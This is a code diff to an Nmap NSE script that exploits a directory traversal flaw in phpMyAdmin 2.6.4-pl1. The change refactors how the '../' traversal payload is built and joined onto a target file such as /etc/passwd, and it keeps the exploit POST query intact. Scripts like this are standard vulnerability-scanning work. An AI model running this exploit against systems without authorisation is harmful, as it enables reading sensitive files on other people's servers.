@@ -16,7 +16,7 @@ Reference:
 
 ---
 -- @usage
--- nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" <host/ip>
+-- nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='/etc/passwd',outfile='passwd.txt'" <host/ip>
 -- nmap -p80 --script http-phpmyadmin-dir-traversal <host/ip>
 --
 -- @args http-phpmyadmin-dir-traversal.file Remote file to retrieve. Default: <code>../../../../../etc/passwd</code>
@@ -75,14 +75,17 @@ portrule = shortport.http
 
 --Default configuration values
 local EXPLOIT_QUERY = "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=%s&subform[1][cXIb8O3]=1"
-local DEFAULT_FILE = "../../../../../etc/passwd"
+local DEFAULT_PAYLOAD= "../../../../.."
+local DEFAULT_FILE = "/etc/passwd"
 local DEFAULT_DIR = "/phpMyAdmin-2.6.4-pl1/"
 local EXPLOIT_PATH = "libraries/grab_globals.lib.php"
 
 
 local function generate_rgf(host, port, options, uri)
   return function (file)
-    local postdata = EXPLOIT_QUERY:format(file)
+    local evil_file = DEFAULT_PAYLOAD .. file
+    local postdata = EXPLOIT_QUERY:format(evil_file)
+    stdnse.debug1(evil_file)
     local response = http.post(host, port, uri, options, nil, postdata)
     return response, uri
   end
@@ -122,7 +125,7 @@ action = function(host, port)
     vuln.extra_info = rfile.." :\n"..contents
     if outfile_status then
       vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
-    else
+    elseif outfile_err then
       vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, outfile_err)
     end
   elseif response_status==500 then
